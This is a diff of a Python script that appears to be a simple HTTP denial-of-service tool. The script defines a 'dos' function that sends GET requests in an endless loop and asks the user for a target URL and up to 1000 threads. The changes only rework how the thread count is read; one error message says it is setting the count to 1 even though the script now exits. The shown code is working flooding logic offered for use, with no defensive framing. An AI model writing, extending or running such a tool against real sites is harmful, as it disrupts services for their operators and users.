@@ -26,20 +26,17 @@ input("Press ENTER to continue ")
 print("")
 def dos(target):
     while True:
-            res = requests.get(url)        
-threads = 20
+            res = requests.get(url)                
 url = input("Target URL [https://example.com]: ")
 if not url.__contains__("http") or not url.__contains__(".") or not url.__contains__("://"):
     while not url.__contains__("http") or not url.__contains__("."):
         print("Please provide a valid URL.")
         url = input("Target URL [https://example.com]: ")
 try:
+    threads = 20
     threads = int(input("Threads [20] [1-1000]:  "))
 except ValueError:
-    threads = 20
-if threads == 0:
-    print("Threads must be at least 1. Setting to 1.")
-    threads = 1
+    exit("Threads must be at least 1. Setting to 1.")
 clearterminal()
 print("-----------------------------------------")
 print("")
